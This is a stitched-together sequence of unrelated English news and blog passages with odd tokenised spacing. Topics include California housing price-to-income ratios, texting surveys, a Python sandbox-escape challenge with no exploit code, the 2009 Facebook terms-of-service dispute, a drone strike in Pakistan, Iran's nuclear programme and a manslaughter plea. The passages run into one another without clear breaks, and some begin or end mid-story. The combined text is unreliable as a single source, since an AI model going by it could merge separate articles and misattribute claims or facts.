One excellent measure of determining whether a home is affordable is looking at the income of households living in the immediate area .
This is a very important data point .
For example , a median price of $ 1 million may seem a lot on the surface but if the median household income of the area is $ 300,000 per year , then the price is right .
In this same line of thought , a home priced at $ 50,000 is expensive if the median income of an area is $ 5,000 .
The above chart tells us a lot .
First , we see that the three most expensive counties are :
San Francisco : 9.89
San Luis Obispo : 7.82
Marin County : 7.46
What the above information tells us for example is that the current median home price for San Francisco is 9.89 the median household income of the area .
That is still extremely overpriced .
In fact , 12 of the 32 counties on the list have income to price ratio of 5 or higher .
This is high .
Across the nation we will find income to price ratios of 3 or 4 which are more within historical standards .
The three least expensive counties in California are :
Stanislaus County : 3.18
Solano County : 3.09
Merced County : 2.83
What this tells us is that using a blanket statement like “ California has hit a housing bottom ” is missing the point .
Certain counties may have already hit a bottom .
Yet you will also need to look at the employment situation in some of these areas .
I have provide 10 reasons why this recession will feel like a minor depression so now we have to also factor in whether other factors like employment growth will hold up .
Looking at places like Detroit we find low ratios but the employment base is quickly shrinking .
And population size of a county does not indicate affordability .
The largest populated county Los Angeles with 9.6 million people has a price to income ratio of 6.46 .
That is extremely high .
Yet a county like San Bernardino with 1.9 million people now has a price to income ratio of 3.42 .
The dynamics of the California housing market are wide and varied .
Analysis # 2 – Median Household Income
To say that a high median household income is enough to qualify for high home prices is wrong .
I think this chart tells a lot more of the California housing bubble story .
When prices reached nearly a $ 500,000 median price across the state , it was clearly a bubble because statewide the median household income is approximately $ 50,000 .
That at the peak put the ratio at 10 which is a difficult ratio to justify .
Even now after the historic bust , we are still very much overpriced .
Let us look really quickly at the top 3 median household income areas and see what their price to income ratios are :
Marin County : Median Income : $ 83,732 – Price - to - income ratio : 7.46
Santa Clara County : Median Income : $ 83,074 – Price - to - income ratio : 5.37
San Mateo County : Median Income : $ 81,573 – Price - to - income ratio : 7.12
This is very useful data .
What we learn is median income in these 3 counties is very similar .
Yet Santa Clara county has a better price ratio of homes to the current income of those in the area .
Let us look at the bottom 3 income areas :
Madera County : Median Income : $ 44,534 – Price - to - income ratio : 3.6
Merced County : Median Income : $ 44,141 – Price - to - income ratio : 2.83
Tulare County : Median Income : $ 41,837 – Price - to - income ratio : 4.18
More useful information .
The incomes again are rather similar for the bottom 3 yet if we look at the ratios , Merced County would be the most “ affordable ” place to buy .
Analysis # 3 – Median Home Price
Just looking at the median home price does not tell the entire story .
If you look at the above chart , we have 2 counties with prices over $ 600,000 , 3 with over $ 500,000 , and 5 with median prices over $ 400,000 .
We would have to go to $ 300,000 to find 16 counties with higher prices , or half of the 32 counties on the list .
But what is the population of these 16 counties ?
Top 16 median priced counties : 22,701,908
Bottom 16 median priced counties : 11,186,688
Keep in mind that we are looking at the largest 32 counties in the state so we are not capturing 100 percent of the picture simply because all the data is n’t available but this data captures 90 percent of the California population .
So on the surface , this may lead you to believe that most people can afford to live in high priced areas .
Or is it that most of these high priced areas are in a bubble and that is why people are now struggling with holding onto their homes ?
Let us run a quick average of the price - to - income ratio of both subsets :
Top 16 counties average price to income ratio : 6.11
Bottom 16 counties average price to income ratio : 3.61
This is a very important data set here because of the bifurcation of the state .
What we can derive is the lower priced counties are starting to find a bottom yet the top 16 are still over priced .
This is important because someone looking to buy in Merced would arrive at a different conclusion than someone looking to buy in San Francisco .
We are looking at income relative to each county so we are painting with a very narrow brush here .
Take a look at the population breakdown :
The above chart breaks down the 32 counties in our data set by population .
It is the case that the California housing market is diverse and has enormous variability .
I have argued before that California will not see a bottom until 3 years in the future and have provided an additional 3 reasons .
Yet with that argument , I was looking at the state on an aggregate basis and not on individual levels .
What this analysis shows is that certain counties are arriving at bottoms much quicker and higher price areas are much more stubborn yet are coming down in price .
This happens in most housing bubbles .
The marginal areas get hit first and progressively move up the spectrum to higher priced areas .
If you are planning on buying in the near future , make sure you know where you live and take all the data into consideration .
Simply saying we are at a bottom is too broad a statement for the California housing market .

NEW YORK ( Reuters ) - A California train engineer who was sending and receiving text messages was blamed last month for causing one of the worst railroad crashes in U.S. history that killed 25 people .
Slideshow ( 4 images )
Despite such risks , many Americans send and receive text messages on mobile e-mail devices in dangerous situations , according to a survey released on Tuesday that showed 77 percent have used such a device while driving a moving car .
Forty - one percent said they have used a mobile e-mail device such as a BlackBerry while skiing , on horseback or riding a bicycle , said the survey commissioned by Neverfail Inc , an Austin , Texas - based software company that provides protection for business data , operations and applications .
The engineer of a crowded commuter train was text - messaging from his cell phone seconds before his train skipped a red light and collided with a freight train near Los Angeles in September , killing 25 people , investigators found .
The Neverfail survey said the proportion of the corporate work force using company - supplied mobile devices will grow to nearly 40 percent by 2010 from just under one - quarter now .
In the economic crisis workers may feel squeezed and under pressure to use their mobile devices even more , said Michael Osterman , president of Osterman Research of Black Diamond , Washington , which conducted the survey for Neverfail .
“ People are going to have to do more than they are doing now , ” he said .
“ As people get laid off , the responsibilities of the company do n’t go away , but the people to do the work do . ”
Also , 11 percent of respondents said they have used such a device during a romantic moment , and 79 percent said they have used one in the bathroom , it said .
Eighteen percent have used one during a wedding , 16 percent during a funeral or memorial service and 37 percent during a graduation , it said .
The online survey was conducted August 4 through August 26 , 2008 , of 148 U.S. adults .
The margin of error varied for each question but averaged plus or minus 5 percentage points .
Along the same topic , earlier this year the American College of Emergency Medicine warned people not to text message while walking , skating , riding a bicycle or driving .
It said its members were noticing a rise in injuries and deaths related to sending text messages at inappropriate times .
A survey last year by the AAA travel and motorist group found nearly half of U.S. teen - agers sent text messages while driving .
In New York , a state legislator has proposed a bill to combat so - called “ iPod oblivion ” and fine pedestrians for crossing city streets while wearing portable media players .
As we noted earlier , a federal agency killed the SEC 's investigation into Allen Stanford back in 2006 .
We do n't know which one it is , but some commenters suspect it could 've been the CIA .
After all , last year , Stanford 's Venezuelan offices were raided on suspicion that the billionaire was a US government tool , involved in spying
Telegraph : Officials from Venezuelan military intelligence raided a branch of his offshore bank over claims that its employees were paid by the CIA to spy on the south American country .
The officials spent three hours searching files and documents at offices of Stanford International Banks in the Venezuelan capital Caracas , removing several of them for closer inspection .
The Stanford Group 's spokeswoman , Lula Rodriguez , denied that any of the bank 's employees were involved in spying .

If the SEC does n't know where Stanford is , is there any chance the CIA does ?
Exclusive Japanese scientists have made a dramatic break with the UN and Western - backed hypothesis of climate change in a new report from its Energy Commission .
Three of the five researchers disagree with the UN's IPCC view that recent warming is primarily the consequence of man-made industrial emissions of greenhouse gases .
Remarkably , the subtle and nuanced language typical in such reports has been set aside .
One of the five contributors compares computer climate modelling to ancient astrology .
Others castigate the paucity of the US ground temperature data set used to support the hypothesis , and declare that the unambiguous warming trend from the mid-part of the 20th Century has ceased .
The report by Japan Society of Energy and Resources ( JSER ) is astonishing rebuke to international pressure , and a vote of confidence in Japan 's native marine and astronomical research .
Publicly - funded science in the West uniformly backs the hypothesis that industrial influence is primarily responsible for climate change , although fissures have appeared recently .
Only one of the five top Japanese scientists commissioned here concurs with the man-made global warming hypothesis .
JSER is the academic society representing scientists from the energy and resource fields , and acts as a government advisory panel .
The report appeared last month but has received curiously little attention .
So The Register commissioned a translation of the document - the first to appear in the West in any form .
Below you 'll find some of the key findings - but first , a summary .
Summary
Three of the five leading scientists contend that recent climate change is driven by natural cycles , not human industrial activity , as political activists argue .
Kanya Kusano is Program Director and Group Leader for the Earth Simulator at the Japan Agency for Marine - Earth Science & Technology ( JAMSTEC ) .
He focuses on the immaturity of simulation work cited in support of the theory of anthropogenic climate change .
Using undiplomatic language , Kusano compares them to ancient astrology .
After listing many faults , and the IPCC 's own conclusion that natural causes of climate are poorly understood , Kusano concludes :
" [ The IPCC 's ] conclusion that from now on atmospheric temperatures are likely to show a continuous , monotonic increase , should be perceived as an unprovable hypothesis , " he writes .
Shunichi Akasofu , head of the International Arctic Research Center in Alaska , has expressed criticism of the theory before .
Akasofu uses historical data to challenge the claim that very recent temperatures represent an anomaly :
" We should be cautious , IPCC 's theory that atmospheric temperature has risen since 2000 in correspondence with CO2 is nothing but a hypothesis . "
Akasofu calls the post -2000 warming trend hypothetical .
His harshest words are reserved for advocates who give conjecture the authority of fact .
" Before anyone noticed , this hypothesis has been substituted for truth ...
The opinion that great disaster will really happen must be broken . "
I was told over the dinner table a hundred times when I was a kid that carrots can make you see in the dark , and loads of people swear orange juice will stave off a cold .
But aficionados of the US internet newspaper the Huffington Post , and umpteen other blogs , are now mulling over a guide to food and drink options that purportedly boosts your brain , lowers your blood pressure or staves off cancer .
A link to the Foodproof site brings up the " top 100 foods to improve your productivity " .
A few of the suggestions might give pause for thought .
Cake sounds unlikely to do much for the digestion , though I 'm willing to believe it may be good for inducing sleep .
More likely it will pile on the pounds .
And diet soda as a " low - fat filling food " ?
Cheese and milk also reside in this category - but surely only the tasteless low - fat version .
On the whole , though , what these type of lists give you are intrinsically good foods , such as fish , chicken , watermelon , pineapple and almonds , which have been in some way , at some time , linked , however tenuously , to particular benefits , or protection against certain diseases .
Eating these things is not proven to stop you getting cancer or improve your eyesight , but as part of a varied and balanced diet , they may do you some good .
The benefits we do know about generally come from groups of foods rather than single items , according to nutritionist Glenys Jones from the Human Nutrition Research unit in Cambridge , which advises the government on its anti-obesity strategy .
" It is very hard to pin it down to one specific food .
That 's because we have lots of other things affecting us , " she says .
" It may be that the people eating more fruit and veg are the people who go to the doctor and get treatment earlier , or do n't smoke . "
Exercise is an important factor too .
" We wo n't find one miracle food that will compensate for an unhealthy lifestyle . "
There has been much hype over cancer - preventing foods , says Ed Yong , health information manager at Cancer Research UK .
" In some cases there is scientific evidence to support this , but usually this comes from studies of small numbers of people or of cells grown in Petri dishes .
Also , researchers may test molecules that are present in only small amounts in food , so you would have to eat an unmanageable amount of the original food to get the supposed benefits ...
Tomatoes , green tea , pomegranates , blueberries and vitamin C have all been trumpeted as our dietary saviours over the years .
But to date , none of this evidence is compelling enough to single out any of these as a ' superfood ' . "
So there you have it .
Do n't eat one or two of these foods , but a mixture of all of them .
Maybe go steady on the cake though .
The fidelity of protein synthesis is necessary for a properly functioning organism .
In an aged animal , the overall rates of protein synthesis and degradation / recycling decline with age .
Not only does this decrease the number of structural and enzymatic proteins available , but it increases the half life of proteins , perhaps allowing more time for these proteins to become oxidatively damaged .
Protein synthesis is also linked to nutrient availability through the TOR signaling pathway , implicating protein synthesis in the mechanism of life extension by calorie restriction ( CR ) .
CR counteracts the decline in protein turnover seen with age .
Inhibiting protein synthesis also increases lifespan in C. elegans .
Wang et al examined the link between the rate of protein synthesis and mitochondrial degeneration .
Working in yeast , they introduced a mutation into adenine nucleotide translocase ( aac2A128P ) , a protein located on the mitochondrial membrane .
This mutation mimics the human disease progressive external ophthalmoplegia ( PEO ) .
The authors speculate that aac2A128P might upset the availability of nucleotides , which in turn could cause deletions of mtDNA , a hallmark of PEO .
In addition , they show that the introduction of aac2A128P causes a decrease in membrane potential , which has already been shown to play a key role in aged mitochondria .
aac2A128P mutants also have a decreased replicative lifespan .
The authors next tested whether any known lifespan - extending mutations can suppress the mitochondrial dysfunction induced by the aac2A128P mutation .
Three of these mutations were particularly robust in reversing the aac2A128P mutation .
sch9Δ , rpl6BΔ and rei1Δ on a aac2A128P background were able to form viable colonies at almost wild type levels .
SCH9 is involved in nutrient sensing ; RPL6B is a protein that makes up the ribosome ; and REI1 is involved in ribosome processing .
Overexpression of the well - known yeast sirtuin SIR2 did not have any effect on replicative lifespan in the aac2A128P mutant .
sch9Δ , rpl6BΔ and rei1Δ mutants , even with the aac2A128P mutation , outlived their wild type counterparts .
The lethal aac2A128P / phb1Δ double mutant was still viable with these three life - extending mutations .
phb1Δ mutants have reduced mitochondrial membrane potentials and are susceptible to ethidium bromide .
sch9Δ , rpl6BΔ and rei1Δ mutants on a phb1Δ background were resistant to ethidium bromide .
CR had similar effects as these three lifespan - extending mutants , but other long - lived mutants , like tor1Δ , were only able to suppress the aac2A128P – and not the aac2A128P / phb1Δ double mutant – defect in mitochondrial membrane potential .
Might mitochondrial membrane potential be linked to protein synthesis ?
The researchers found that all of the lifespan - extending mutations examined had reduced total protein synthesis .
sch9Δ , rpl6BΔ and rei1Δ mutants had some of the largest decreases .
According to the authors , lower rates of protein translation will reduce stress from unassembled protein complexes .
“ Reduction of cytosolic protein synthesis may lower the overall loading of proteins onto the mitochondrial inner membrane and promote mitochondrial membrane potential maintenance . ”
To examine the link between mitochondrial membrane potential and protein synthesis , the authors looked at the yme 1Δ mutant .
YME1 encodes a protease important for protein turnover , so , according to the authors , the altered mitochondrial membrane potential of the aac2A128P mutant will worsen with decreased protein turnover .
sch9Δ , rpl6BΔ and rei1Δ mutants were able to suppress the lethal aac 2A128P / yme 1Δ double mutant .
This paper links two aging - associated deficiencies : mitochondrial defects and decreases in protein synthesis .
These connections are becoming more and more common in the aging field .
But why did some life - extending mutations cause reversions in the aac2A128P mutant while others did n’t ?
How many paths are there to extended longevity ?
The data above presents another conundrum .
Protein synthesis declines with age , yet decreasing protein synthesis extends lifespan .
What ’s going on here ?
My guess is that decreased protein synthesis when you ’re young in addition to inhibiting the decline in protein translation as you get older will delay the aging process .
Update :
You can find out more in my new article : Paving the Way to Securing the Python Interpreter
The challenge is simple :
Open a fresh Python interpreter and do : >>> from safelite import FileReader
You can use FileReader to read files on your filesystem
Now find a way to write to the filesystem from your interpreter
You can find the latest version of safelite .
py here :
I will keep safelite .py updated as new exploits and workarounds are found until we hopefully end up with a version we can be confident about .
[ VERSION attribute added on Steven D'Aprano 's recommendation . ]
If enough smart hackers look at this and it holds up , Guido promises to accept a patch which would enable this function - based approach to security on both App Engine and future Python versions .
So , please try the challenge and let me know how you find it in the comments .
Thanks !
Note :
The aim of this is n't to protect Python against crashes / segfaults or exhaustion of resources attacks , so those do n't count .
Good luck and thanks ! =)

The row over Facebook 's change in its terms of service governing users personal data highlights the need for a privacy law , claims a leading watchdog .
The Electronic Privacy Information Centre was on the brink of filing a legal complaint when Facebook announced it would revert to its old policy .
The new terms seemingly gave Facebook vast control over users ' content .
" This row underlines the need for comprehensive privacy laws , " said Epic 's president Marc Rotenberg .
" It is great that Facebook has responded by going back to its old terms of service .
That is a step in the right direction , but these issues do n't go away .
" It 's going to be an ongoing concern for users until we get privacy laws in place , " Mr Rotenberg told the BBC .
" Feedback " Epic , along with 12 other consumer and civil liberty groups , were intending to file a complaint with the Federal Trade Commission about the policy changes when it was stopped in its tracks .
" We got a call late last night from Facebook and they said that they were thinking of going back to their original terms of service , " said Mr Rotenberg .
Countless Facebook users cancelled their accounts following the changes " We said that if they would agree to do that , we would n't see the need to file the complaint . "
In a blog post , Facebook founder Mark Zuckerberg wrote : " Over the past few days , we have received a lot of feedback about the new terms we posted two weeks ago .
" Because of this response , we have decided to return to our previous Terms of Use while we resolve the issues people have raised . "
Mr Zuckerberg said Facebook would draw up a new document in conjunction with its users .
The company has set up a special group called " Facebook Bill of Rights and Responsibilities " to let users have their say .
The group had more than 55,000 members just a few hours after its creation .
" Overarching and scary " Originally Facebook 's founder Mark Zuckerberg defended the changes , unveiled on 4 February noting they were to " better reflect how users used the site . "
He had said they were made to ensure that if a user deleted his or her account , any comments he or she had left on a friend 's Facebook page would not also disappear .
Tens of thousands of users voiced their anger at the changes
That was not how they were interpreted .
Over the weekend , a popular consumer advocacy blog , The Consumerist , raised alarm bells over the issue .
It defined the changes as meaning " anything you upload to Facebook can be used by Facebook in any way they deem fit , forever , no matter what you do later " .
Users took notice and created Facebook groups to oppose the changes .
One of the biggest , " People Against the New Terms of Service " grew to over 90,000 in a matter of days .
Group founder Julius Harper Jr of Los Angeles hypothesised that if Facebook wanted to it could take his photographs and " I could see my face on the side of a bus and there would be no recourse to complain " .
Such situations were never intended said Facebook spokesman Barry Schnitt .
" Facebook does not , nor have we ever , claimed ownership over people 's content .
Your content belongs to you , " he stressed .
" Wake up " The issue has raised concerns over who does own personal material , from photos to videos to comments stored on a social networking site .
Facebook is the world 's biggest with 175 million users .
The Electronic Privacy Information Centre had planned to file a complaint " This just reflects the ongoing process of people trying to figure out the internet , " John Byrne , a senior analyst at Technology Business Research Inc. told Computerworld.com .
" The lesson that should be learned is that these content sites are not your own personal diaries .
Consider it more as publishing and less about your personal circle of friends .
People need to wake up , " suggested Mr Byrne .
Simon Davies of Privacy International criticised Facebook for allowing commercial and legal concerns to override its commitment to users .
" It appears to be going down the same road as Google .
Its halo is beginning to slip , " Mr Davies told the BBC .
He advised users to " ratchet their privacy settings up to the maximum " to restrict advertisers ' access to their data and ensure that their details are fully protected .
Back in 2007 , Facebook faced a firestorm of criticism when it introduced a service called Beacon .
Users were concerned Facebook would provide advertisers with too much of their information .
Mr Rotenberg said Facebook is not alone in trying to juggle the needs of users with the need to make money .
" There is always a tug of war over users ' data . "
However Mr Rotenberg said he was impressed with the speed in which Facebook acted and hoped such willingness to listen will continue .
" Mark Zuckerberg said users should be able to own and control their information .
If everyone starts with that principle we can end up in a very good place .
On a lot of these issues where there is confusion on that point , I see a lot of debate . "

Swedan is said to have been Kini 's top aide Al - Qaeda 's operations chief in Pakistan and another top aide have been killed , US and Pakistani sources say .
Kenyans Usama al - Kini and Sheikh Ahmed Salim Swedan were killed last week by a missile fired from a US drone near the Afghan border , the sources said .
Kini was believed to be behind last year 's deadly attack on the Marriott hotel in Islamabad , US officials said .
Fifty - five people were killed when a truck packed with explosives rammed the hotel in September 2008 .
A Pakistan government official , requesting anonymity , told the BBC the two men were killed along with a militant from Pakistan 's Punjab province in South Waziristan , on Pakistan 's border with Afghanistan .
A US counter - terrorism official said it was strongly believed that they were killed in a missile strike by a CIA drone aircraft on a building on 1 January .
' Significant '
The Pakistani military said it was conducting its own investigation .
Kini was involved in the Islamabad Marriott attack , officials say The men - both born in Kenya - were on the FBI 's most - wanted list over the 1998 bombings of US embassies in Kenya and Tanzania .
Kini was also thought to have been behind an unsuccessful attempt on the life of former Pakistani Prime Minister Benazir Bhutto , who was later killed in a separate attack , US officials said .
The Pakistani official told the BBC the two were trying to develop a weapon that could shoot down the high - flying drone aircraft .
He said he did not know if they were involved in the suicide bombing of the Marriott but he said Kini was certainly behind the bombing of the Danish embassy in Islamabad in June last year .
They were known in South Waziristan as " The Lion " and " Mr Engineer " , the official added .
It was reported on 1 January that an unmanned CIA aircraft had fired three missiles in the Karikot area of South Waziristan , killing three suspected militants .
Initial reports suggested those killed were militants of Turkmen origin .
The US has launched dozens of similar drone attacks in recent months , mostly targeting Taleban and al - Qaeda militants in Pakistan 's tribal regions .
The lawless tribal areas ( Fata ) on Pakistan 's border with Afghanistan are considered a sanctuary for the insurgents .
The US says the militants regularly cross over the porous border into Afghanistan where the US troops have been fighting since 2001 .
The drone attacks are believed to have been largely on - target , hitting Taleban and al - Qaeda hideouts .
There have been few civilian casualties , officials say .
But Pakistani media and opposition parties term these attacks a violation of Pakistan 's sovereignty and territorial integrity and the government has been under immense public pressure to defend its territory against them .
Islamabad says the attacks are counter - productive as they help offset the negative popularity the Islamist militants have gained in areas under their control .

A guy from Toronto was the first man to get an eyeball tattoo .
Yeah , you read that right , an eyeball tattoo .
The end result was a blue eye , and it took 40 injections of blue ink to achieve that .
Funny enough , I ’ve been watching Dune these last few days and the first thing that popped in my head was “ Fremen ”
This is what Paul said about it :
I really have to emphasize again that the procedure was extensively researched and done by people who were aware of the risks and possible complications and that it should not be casually attempted .
Now that this experiment has been started , please wait for us to either heal or go blind before trying it .
More photos and they ’re just as disgusting .
Editor 's note : Julian E. Zelizer is a professor of history and public affairs at Princeton University 's Woodrow Wilson School .
He is completing a book on the history of national security politics since World War II , to be published by Basic Books .
Zelizer writes widely on current events .
Julian Zelizer says Congress can play a key role by investigating what went wrong on Wall Street .
PRINCETON , New Jersey ( CNN ) --
In Tuesday night 's speech , President Obama attempted to calm the nation , explaining how his programs will stimulate the economy and create a foundation for long - term economic growth .
Obama sought to explain what went wrong , starting with the elimination of regulations on the purchase of homes that people could not afford .
Obama explained that it is " only by understanding how we arrived at this moment that we 'll be able to lift ourselves out of this predicament . "
The president 's speech was badly needed .
And President Obama is right , we need to understand how we arrived at this moment .
But one speech is not enough .
Americans are more frightened about the economy with each and every new day .
Jobs are being lost , stock prices are falling and home values plummeting .
According to an Associated Press - GfK poll , about half of those surveyed said they were seriously worried about losing their jobs and two - thirds expressed serious concern that they would not be able to pay their bills .
Americans are not sure what has gone wrong .
Under those conditions , it will be difficult to restore confidence in the future .
The conventional wisdom says that presidents should be the leaders to use the bully pulpit and explain to Americans the nature of any crisis that we face .
But history shows that Congress has played an extremely important role in shaping public debate in times of crisis and bringing to light crucial information .
Although congressional hearings are often derided for grandstanding , the power of investigation is one of the most important functions Congress has played .
For every example of congressional excess , such as Sen.
Joseph McCarthy 's anticommunist witch hunts , there have been moments when Congress demonstrated its ability to explain and to educate .
Congress has been central to the investigation of political corruption .
One of the most famous moments in the history of the institution took place in 1973 when the southern Democrat Sam Ervin , known for his folksy speech , chaired Select Committee hearings into the scandals surrounding President Richard Nixon .
The committee put together the various pieces of the Nixon White House 's scandalous behavior , providing the fullest picture of the corruption that defined that presidency .
The investigation , watched by millions , revealed the cover - up that had taken place as well as a much wider web of illegal activities .
The hearings altered popular understanding of what Watergate was about -- namely that Nixon 's wrongdoing was potentially far more serious than they had thought .
Congress has also helped raise questions and gather data about foreign policy .
In 1966 , Arkansan Sen . William Fulbright , chairman of the Senate Foreign Relations Committee , dragged members of President Lyndon Johnson 's administration before his committee to expose some of the weaknesses that were only starting to become apparent in the administration 's Vietnam policies .
Criticism about the war , which had been confined to college campuses , started to spread into middle - class , suburban homes .
Most relevant to today , Congress has investigated the causes behind economic downturns , using the power of investigation to raise public concern and improve knowledge of the economy .
This was the case with the famous Pecora Commission , the Senate Committee on Banking and Currency formed in the period between President Franklin Delano Roosevelt 's election in November 1932 and his inauguration in March .
It was a commission that lasted through May 1934 .
The commission set out to discover what had led to the stock market crash in 1929 .
Committee Chairman Duncan Fletcher of New Jersey placed Ferdinand Pecora , the committee 's chief counsel , in charge of the investigation .
Pecora , a tough New York prosecutor , proved to be a masterful interrogator .
" I looked with astonishment , " said his staffer John Flynn , a former journalist , " at this man who , through the intricate mazes of banking , syndicates , market deals , chicanery of all sorts , and in a field new to him , never forgot a name , never made an error in a figure , and never lost his temper . "
Pecora brought some of the most prominent figures from Wall Street to speak with the commission and to answer difficult questions .
Americans learned that the tycoon J.P. Morgan had not paid income taxes for three years .
Even worse , tax evasion was common among the wealthy .
In his new book on FDR 's Hundred Days , Adam Cohen recounts how the hearings revealed how National City Bank had caused enormous problems by mixing commercial and investment banking , reaping huge profits as customers were persuaded to make terrible investments .
Preferential treatment on stock , Americans learned , was routine as certain clients on Morgan 's " preferred list " were given the best offers .
By the time it closed , the commission produced thousands of pages of data about the inside operations of the financial world .
As a result of the Pecora Commission , public pressure for banking reform greatly intensified .
The 1929 crash seemed like much less of a mystery when Pecora was done .
Congress passed historic banking regulations during the New Deal , including the Glass - Steagall Banking Act of 1933 , the Securities Act of 1933 , and the Public Utility Holding Company Act of 1935 , all of which vastly expanded the role of the federal government in overseeing and regulating Wall Street .
Partisan warfare in the 1990s , including the impeachment proceedings against President Bill Clinton , made many Americans cynical about congressional investigation , as it seemed to be just another tool in the bitter culture of Capitol Hill .
But Congress can help us learn .
We need another Pecora Commission , another Fulbright Committee , another Sam Ervin to use the power of Congress to shed light on the causes of our current economic meltdown .
Congress needs to learn more , not only about the kind of criminal activity for which Bernard Madoff is being charged , but also the legal practices -- such as risky home loans -- that created dangerous bubbles and put families at risk .
If voters and politicians are going to be able to evaluate legislation that is being proposed on a weekly basis , citizens must understand what has gone wrong .
This will be the first step toward restoring the confidence that the country needs if it is to start a better day .

This is really cool .
I like how you put each person infront of a backgroun of the other color and alternated between RED and BLU .
Looks nice and clean .
And I like how you set the states up so you really have to look around but not squint to find everything .

I have recently had several opportunities on various news programs to discuss the economy and what is wrong with the so - called economic stimulus package .
I have said over and over what we should n’t be doing , and now I ’d like to explain what we should be doing .
But to improve the situation , you must first have a solid grasp of how we got here .
Government policies and central planning created the housing bubble , now going bust .
About a decade ago the government made expanded homeownership and affordable housing a public goal .
Through Fannie Mae , Freddie Mac and the secondary mortgage market the government incentivized creative , low down - payment , more widely available mortgage products , and discouraged the market - proven lending standards of the past .
The Federal Reserve kept interest rates artificially low , which added more fuel to this fire .
Many related sectors temporarily flourished because of this , and many people got into homes they otherwise could not have afforded .
The increased demand for housing sent prices soaring until in many markets housing became even more unaffordable , necessitating even more creative mortgages , and impossibly leveraging homeowners .
Many risky investment vehicles such as mortgage - backed securities , derivatives , credit default swaps grew out of this unsustainable situation .
As the foreclosures began , the house of cards started to tumble .
Too many people have confused the symptoms and the pain of the bust with the problematic policies that caused the bubble , which is really what needs to be treated .
First of all , just as the best cure for a hangover is not to drink so much , the best cure for a recession is a recession .
It is time to sober up and return to free market sanity , risk and reward , supply and demand , without political intervention .
Politicians are good at catering to the needs of special interests , but very bad at determining what needs to take place in the market .
Government should stick to punishing fraud and enforcing contracts .
When they use the tax code , bureaucratic departments and their manipulative rules and regulations to dictate social and economic behavior , we end up with distortions and malinvestments .
Bailing out banks , continuing failed Fed policies and strapping the taxpayer with toxic debt will worsen the pain , and punish the innocent .
If Congress really wanted to do something helpful , it would cut taxes .
Ideally , we would repeal the income tax altogether and get the IRS off the economy ’s back , which would be a huge boon .
We should also cut spending .
Cut every unconstitutional department and program , every wasteful governmental encroachment on the people ’s liberty and money , starting with our massive overseas empire .
The cost of our empire is bringing us to our knees , just as the Soviets ’ empire did to them .
Congress should also abolish the Federal Reserve and take back its responsibilities to ensure sound money , safe from the manipulations of powerful banking interests .
These things would constitute real change , real economic stimulus .
The plans being bandied about Washington are just more of the same .
As long as no one seriously considers the cure , we are unfortunately destined to prolong the disease .

Lake Natron , in Africa ’s Great Rift Valley , practically sends a warning with its color .
This bright red lake is the world ’s most caustic body of water , but not to everything .
An endemic species of fish , the alkaline tilapia , lives along the edges of the hotspring inlets , and the lake actually derives its color from salt - loving microorganisms that thrive in its alkaline waters .
Spirulina , a blue - green algae with red pigments , passes its pigments along to the Lesser Flamingoes that feed on the algae and raise their young here .
The Advanced Spaceborne Thermal Emission and Reflection Radiometer ( ASTER ) flying on the Terra satellite captured this image on March 8 , 2003 .
This image simulates natural color , showing where the salt - loving microorganisms have colored the lake ’s salt crust red or pink .
The salt crust changes over time , giving the lake a slightly different appearance each time it is photographed by astronauts or imaged by satellites .
Volcanic ash from the Great Rift Valley has collected in local lake basins , creating a network of soda lakes hostile to most organisms .
This forbidding environment enables Lake Natron to serve millions of flamingoes as the ideal nursery ; would - be predators avoid the saline lake and leave young birds in peace .
Flamingoes must exercise caution , however , because the lake can turn deadly even to them .
Depending on rainfall , its alkalinity can approach that of straight ammonia , and when the lake is flooded with water that has heated underground , its temperature can reach a scalding 60 degrees Celsius ( 140 degrees Fahrenheit ) .
The uniqueness of Lake Natron prompted Tanzania to add the lake to the Ramsar List of Wetlands of International Importance on July 4 , 2001 .

The acceleration of the Iranian nuclear program represents a defeat for the Clinton Administration 's drive to halt the spread of nuclear technology to Iran .
Iran , like Iraq , was to have been isolated by severe sanctions in a policy described by Administration officials as " dual containment . "
But senior Administration officials interviewed in Washington said their efforts had failed to halt the flow of nuclear technology to Iran .
The most active center for nuclear weapons research and production is in Bushehr , on the Persian Gulf 470 miles south of the capital , Teheran .
It has two reactors under construction , each designed to generate up to 1,300 megawatts of electrical power , about as much as the largest reactors in the United States .
So far the Iranians have done little more than amass nuclear material and some equipment , including a neutron source reactor and an isotope separator .
They have yet to build , as the North Koreans did , a nuclear reactor that can be used to develop nuclear weapons .
But the Americans and Israelis worry that if the scheduled building programs proceed , Iran will have all the components needed to build atomic weapons by the decade 's end .
A prominent specialist on Iran , Dr. Shahram Chubin of the Graduate Institute for International Studies in Geneva , who is the author of a recent article on the Iranian nuclear weapons program , agrees that the Iranians could have nuclear weapons within five years .
But he is less certain that Iran would be a serious threat at that point .
" How will a few weapons that can't be developed very far get them anywhere ? "
Dr. Chubin said in a telephone interview from Geneva .
" Here is a country that can't make its own missiles .
It has had a missile program for 10 years and still imports missiles with 1950 's technology from North Korea .

CROIX , Minn . 
From the hallway , Abby Brown ’s sixth - grade classroom in a little school here about an hour northeast of Minneapolis has the look of the usual one , with an American flag up front and children ’s colorful artwork decorating the walls .
But inside , an experiment is going on that makes it among the more unorthodox public school classrooms in the country , and pupils are being studied as much as they are studying .
Unlike children almost everywhere , those in Ms. Brown ’s class do not have to sit and be still .
Quite the contrary , they may stand and fidget all class long if they want .
And they do .
On one recent morning , while 11 - year - old Nick Raboin had his eye on his math problems , Ms. Brown was noticing that he preferred to shift his weight from one foot to the other as he figured out his fractions .
She also knew that his classmate Roxy Cotter liked to stand more than sit .
And Brett Leick is inclined to lean on a high stool and swing his right foot under a desk that is near chest level .
Helps with concentration , he and Ms. Brown say .
The children in Ms. Brown ’s class , and in some others at Marine Elementary School and additional schools nearby , are using a type of adjustable - height school desk , allowing pupils to stand while they work , that Ms. Brown designed with the help of a local ergonomic furniture company two years ago .
The stand - up desk ’s popularity with children and teachers spread by word of mouth from this small town to schools in Wisconsin , across the St. Croix River .
Now orders for the desks are being filled for districts from North Carolina to California .
Three young women have pleaded guilty to voluntary manslaughter for luring a man to an isolated area near the ocean in San Francisco , shooting him in the head and stealing his car and wallet , authorities said Wednesday .
Kimberly Gutierrez , 21 , of San Francisco , pleaded guilty Friday and faces up to 21 years in prison for her role in the killing of Eugene Gorenman , 27 , of San Francisco , who was found dead near a gun battery at Fort Funston on March 29 , 2004 .
Gutierrez was 16 at the time .
She had been charged as an adult with murder , and could have been sentenced to 25 years to life if convicted .
A co-defendant , Felicia Mehrara , 21 , was also a juvenile at the time of the killing .
She and another co-defendant , Jillian McIlvenna , 24 , also pleaded guilty to manslaughter rather than be tried for murder .
